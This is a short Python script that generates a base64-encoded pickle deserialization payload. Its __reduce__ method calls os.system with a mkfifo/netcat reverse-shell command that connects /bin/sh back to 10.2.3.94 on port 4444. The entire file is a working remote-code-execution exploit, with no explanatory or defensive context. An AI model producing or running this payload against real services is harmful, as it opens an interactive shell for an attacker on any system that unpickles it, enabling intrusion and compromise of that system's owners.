import pickle, sys, base64

cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ' '/bin/sh -i 2>&1 | netcat 10.2.3.94 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system, (cmd,))

print(base64.b64encode(pickle.dumps(rce())))

